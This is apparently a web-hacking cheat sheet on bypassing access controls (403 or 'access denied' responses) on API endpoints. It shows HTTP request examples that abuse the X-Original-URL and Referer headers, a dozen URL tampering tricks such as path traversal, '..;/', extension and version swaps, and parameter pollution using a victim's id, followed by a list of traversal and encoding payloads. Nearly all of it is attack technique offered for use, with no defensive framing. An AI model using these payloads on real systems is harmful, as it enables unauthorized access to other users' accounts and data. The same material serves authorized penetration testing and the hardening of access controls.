# Web-Hacking #
## Topics 

#### Tricks
<b>If you want do bypass endpoint always try to use own methodology.</b>

Example:

Http Header based bypass:

1. X-Original-URL: /redact

Example:<br/>
 
  
GET /api/getUser HTTP/1.1 → 403
Host: redact.com

GET / HTTP/1.1
Host: redact.com
X-Original-URL: /api/getUser → 200 OK

2. Referer: https://site.com/api/redact

Example:<br/>
  

GET /api/getUser HTTP/1.1 → acess denied
Host: redact.com

  
  
GET / HTTP/1.1
Host: redact.com
Referer: https://site.com/api/getUser → 200 OK
 
  or
  
GET / HTTP/1.1
Host: redact.com
Referer: https://site.com/api/getUser → 200 ok

More examples:

3. https://site.com/api/v1/users/redactid → access denied
https://site.com/api/v1/users/redactid.json → bypass ok

4. https://site.com/api/v1/redactid → acess denied
https://site.com/api/v1/users/redactid: → bypass ok

5. https://site.com/api/v1/users/redactid → access denied
https://site.com/api/v1/users/redactid..;/ → bypass ok

6. https://site.com/api/v1/users/redactid → access denied
https://site.com/api/v1/users/redactid\..\.\getUser → bypass ok

7. https://site.com/api/v1/users/redactid → access denied
https://site.com/api/v1/users/redactid/ → bypass ok

8. https://site.com/api/v1/users/redactid → acess denied
https://site.com/api/v1/users/redactid?? → bypass ok

9. https://site.com/api/v1/users/redactid → access denied
https://site.com/api/v2/users/redactid → bypass ok
            or
https://site.com/api/v3/users/redactid → bypass ok

10. https://site.com/api/v1/users/redactid → access denied
https://site.com/api/v1/users/redactid&accountdetails → bypass ok

11. https://site.com/api/v1/users/victim?id=BAEILsaqQhk → acess denied
https://site.com/api/v1/users/your?id=UAEILsdUf50&victim?id=BAEILsaqQhk → bypass ok

12. https://site.com/api/v1/users/redactid → access denied
https://site.com/api/v1/users/redactid/email → bypass ok

Payload for basic test:

?
??
&
#
%
%20
%09
/
/..;/
../
..$2f
..;/
../
\..\.\
.././
..%00/
.%0d/
..%5c
..\
..%ff/
%2e%2e%2f
.%2e/
%3f
%26
%23
.json

HTTP Header based bypass:

1. X-Original-URL: /redact
2. Referer: https://site.com/api/redact



